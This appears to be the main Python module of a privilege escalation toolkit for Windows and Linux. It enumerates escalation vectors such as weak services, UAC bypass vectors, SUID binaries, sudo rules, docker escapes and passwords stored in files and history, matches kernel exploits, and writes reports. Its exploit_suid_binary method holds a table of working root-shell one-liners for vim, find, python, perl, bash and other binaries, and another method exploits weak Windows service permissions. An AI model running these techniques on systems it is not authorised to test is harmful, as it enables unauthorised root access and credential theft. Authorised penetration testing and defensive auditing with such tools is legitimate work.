"""Main privilege escalation engine."""

import platform
import json
from pathlib import Path
from typing import Dict, List, Optional

from .windows_enum import WindowsEnumerator
from .linux_enum import LinuxEnumerator
from .kernel_exploits import KernelExploitDB
from .exploit_service import ServiceExploiter


class PrivilegeEscalation:
    """Desktop privilege escalation enumeration and exploitation."""

    def __init__(self):
        """Initialize privilege escalation engine."""
        self.windows_enum = WindowsEnumerator()
        self.linux_enum = LinuxEnumerator()
        self.kernel_db = KernelExploitDB()
        self.service_exploiter = ServiceExploiter()

    def detect_os(self) -> str:
        """Detect operating system.

        Returns:
            OS type ('windows' or 'linux')
        """
        system = platform.system()

        if system == 'Windows':
            return 'windows'
        elif system in ['Linux', 'Darwin']:
            return 'linux'
        else:
            return 'linux'  # Default to Linux for Unix-like systems

    def enumerate_windows(self, local: bool = True, target: str = None) -> Dict:
        """Enumerate Windows privilege escalation vectors.

        Args:
            local: Perform local enumeration (default: True)
            target: Target host for remote enumeration

        Returns:
            Dictionary of enumeration results
        """
        if local:
            return self._enumerate_windows_local()
        else:
            return self._enumerate_windows_remote(target)

    def enumerate_linux(self, local: bool = True, target: str = None) -> Dict:
        """Enumerate Linux privilege escalation vectors.

        Args:
            local: Perform local enumeration (default: True)
            target: Target host for remote enumeration

        Returns:
            Dictionary of enumeration results
        """
        if local:
            return self._enumerate_linux_local()
        else:
            return self._enumerate_linux_remote(target)

    def check_kernel_exploits(self, os_type: str, version: str) -> List[Dict]:
        """Check for known kernel exploits.

        Args:
            os_type: Operating system type ('windows' or 'linux')
            version: OS version string

        Returns:
            List of matching kernel exploits
        """
        return self.kernel_db.search(os_type, version)

    def exploit_service_permissions(self, service_name: str, payload_path: str) -> Dict:
        """Exploit weak service permissions (Windows).

        Args:
            service_name: Service name
            payload_path: Path to payload

        Returns:
            Exploitation result
        """
        return self.service_exploiter.exploit_weak_permissions(service_name, payload_path)

    def exploit_suid_binary(self, binary_path: str, command: str) -> Dict:
        """Exploit SUID binary (Linux).

        Args:
            binary_path: Path to SUID binary
            command: Command to execute

        Returns:
            Exploitation result (simulation)
        """
        result = {
            'success': False,
            'message': '',
            'steps': []
        }

        binary_name = Path(binary_path).name

        # Known SUID exploits
        suid_exploits = {
            'vim': ['vim -c \':!/bin/bash\'', 'vim -c \':set shell=/bin/bash:shell\''],
            'find': ['find / -exec /bin/bash \\;', 'find . -exec /bin/sh -p \\; -quit'],
            'nano': ['nano -s /bin/bash', 'nano then ^R^X reset; sh 1>&0 2>&0'],
            'less': ['less /etc/profile', 'then !bash'],
            'python': ['python -c \'import os; os.setuid(0); os.system("/bin/bash")\''],
            'perl': ['perl -e \'exec "/bin/bash";\''],
            'ruby': ['ruby -e \'exec "/bin/bash"\''],
            'bash': ['bash -p'],
            'systemctl': ['systemctl status', 'then !bash']
        }

        if binary_name in suid_exploits:
            result['success'] = True
            result['binary'] = binary_name
            result['exploit_methods'] = suid_exploits[binary_name]
            result['message'] = f'Found exploit methods for {binary_name}'
            result['steps'] = [
                f'Execute {binary_path} with SUID privileges',
                f'Use exploitation technique: {suid_exploits[binary_name][0]}',
                'Escalate to root shell'
            ]
        else:
            result['message'] = f'No known exploit for {binary_name}'

        return result

    def check_sudo_misconfig(self) -> List[Dict]:
        """Check for sudo misconfigurations (Linux).

        Returns:
            List of sudo misconfigurations
        """
        return self.linux_enum.check_sudo_config()

    def check_path_hijacking(self) -> List[Dict]:
        """Check for PATH hijacking opportunities.

        Returns:
            List of PATH hijacking vectors
        """
        os_type = self.detect_os()

        if os_type == 'linux':
            return self.linux_enum.check_path_writable()
        else:
            # Windows PATH hijacking check (simplified)
            return []

    def export_results(self, results: Dict, output_path: str, format: str = 'json') -> bool:
        """Export enumeration results to file.

        Args:
            results: Results dictionary
            output_path: Output file path
            format: Export format ('json' or 'html')

        Returns:
            True if export successful
        """
        try:
            if format == 'json':
                with open(output_path, 'w') as f:
                    json.dump(results, f, indent=2)
                return True

            elif format == 'html':
                html = self._generate_html_report(results)
                with open(output_path, 'w') as f:
                    f.write(html)
                return True

        except Exception:
            return False

    def categorize_severity(self, finding_type: str) -> str:
        """Categorize severity of finding.

        Args:
            finding_type: Type of finding

        Returns:
            Severity level
        """
        severity_map = {
            'kernel_exploit': 'critical',
            'writable_shadow': 'critical',
            'writable_passwd': 'critical',
            'docker_socket': 'critical',
            'privileged_container': 'high',
            'suid_root': 'high',
            'weak_service': 'high',
            'sudo_nopasswd': 'high',
            'always_install_elevated': 'high',
            'unquoted_service': 'high',
            'writable_path': 'medium',
            'dll_hijacking': 'medium',
            'registry_autorun': 'medium',
            'password_file': 'low',
            'cron_job': 'low'
        }

        return severity_map.get(finding_type, 'medium')

    def auto_enumerate(self) -> Dict:
        """Automatically enumerate based on detected OS.

        Returns:
            Enumeration results
        """
        os_type = self.detect_os()

        if os_type == 'windows':
            return self.enumerate_windows(local=True)
        else:
            return self.enumerate_linux(local=True)

    def _enumerate_windows_local(self) -> Dict:
        """Perform local Windows enumeration.

        Returns:
            Enumeration results
        """
        results = {
            'os_type': 'windows',
            'services': self.windows_enum.check_unquoted_service_paths(),
            'weak_permissions': self.windows_enum.check_weak_service_permissions(),
            'scheduled_tasks': self.windows_enum.check_scheduled_tasks(),
            'registry': self.windows_enum.check_registry_autoruns(),
            'dll_hijacking': self.windows_enum.check_dll_hijacking(),
            'always_install_elevated': self.windows_enum.check_always_install_elevated(),
            'token_privileges': self.windows_enum.check_token_privileges(),
            'uac_bypass': self.windows_enum.check_uac_bypass_vectors(),
            'passwords_registry': self.windows_enum.find_passwords_in_registry(),
            'passwords_files': self.windows_enum.find_passwords_in_files(),
            'installed_software': self.windows_enum.enumerate_installed_software()
        }

        # Add kernel exploits if OS version detected
        try:
            import platform
            version = platform.version()
            results['kernel_exploits'] = self.check_kernel_exploits('windows', version)
        except Exception:
            results['kernel_exploits'] = []

        return results

    def _enumerate_windows_remote(self, target: str) -> Dict:
        """Perform remote Windows enumeration.

        Args:
            target: Target host

        Returns:
            Enumeration results (placeholder)
        """
        # Remote enumeration requires credentials and WinRM/SMB access
        return {
            'os_type': 'windows',
            'target': target,
            'message': 'Remote enumeration not yet implemented'
        }

    def _enumerate_linux_local(self) -> Dict:
        """Perform local Linux enumeration.

        Returns:
            Enumeration results
        """
        results = {
            'os_type': 'linux',
            'suid_binaries': self.linux_enum.find_suid_binaries(),
            'sgid_binaries': self.linux_enum.find_sgid_binaries(),
            'sudo_config': self.linux_enum.check_sudo_config(),
            'cron_jobs': self.linux_enum.check_cron_jobs(),
            'writable_etc': self.linux_enum.check_writable_etc_files(),
            'capabilities': self.linux_enum.check_capabilities(),
            'docker_escape': self.linux_enum.check_docker_escape(),
            'nfs_exports': self.linux_enum.check_nfs_exports(),
            'path_hijacking': self.linux_enum.check_path_writable(),
            'passwords_history': self.linux_enum.find_passwords_in_history(),
            'passwords_config': self.linux_enum.find_passwords_in_config(),
            'kernel_version': self.linux_enum.get_kernel_version(),
            'os_release': self.linux_enum.get_os_release()
        }

        # Add kernel exploits
        kernel_version = results.get('kernel_version', '')
        os_release = results.get('os_release', '')
        results['kernel_exploits'] = self.check_kernel_exploits('linux', f'{os_release} {kernel_version}')

        return results

    def _enumerate_linux_remote(self, target: str) -> Dict:
        """Perform remote Linux enumeration.

        Args:
            target: Target host

        Returns:
            Enumeration results (placeholder)
        """
        # Remote enumeration requires SSH access
        return {
            'os_type': 'linux',
            'target': target,
            'message': 'Remote enumeration not yet implemented'
        }

    def _generate_html_report(self, results: Dict) -> str:
        """Generate HTML report from results.

        Args:
            results: Results dictionary

        Returns:
            HTML report string
        """
        os_type = results.get('os_type', 'unknown')

        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Privilege Escalation Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #333; }}
        h2 {{ color: #666; margin-top: 30px; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .high {{ color: #f57c00; font-weight: bold; }}
        .medium {{ color: #fbc02d; }}
        .low {{ color: #388e3c; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f5f5f5; }}
    </style>
</head>
<body>
    <h1>Privilege Escalation Enumeration Report</h1>
    <p><strong>OS Type:</strong> {os_type}</p>
"""

        # Add sections for each finding type
        for category, findings in results.items():
            if category in ['os_type', 'kernel_version', 'os_release', 'target', 'message']:
                continue

            if isinstance(findings, list) and findings:
                html += f"<h2>{category.replace('_', ' ').title()} ({len(findings)})</h2>\n"
                html += "<ul>\n"
                for finding in findings[:20]:  # Limit to 20 items per category
                    severity = finding.get('severity', 'low')
                    desc = finding.get('description', str(finding))
                    html += f'<li class="{severity}">{desc}</li>\n'
                html += "</ul>\n"

        html += """
</body>
</html>
"""

        return html

    def _load_kernel_db(self) -> Dict:
        """Load kernel exploit database.

        Returns:
            Kernel exploit database
        """
        return self.kernel_db._load_database()
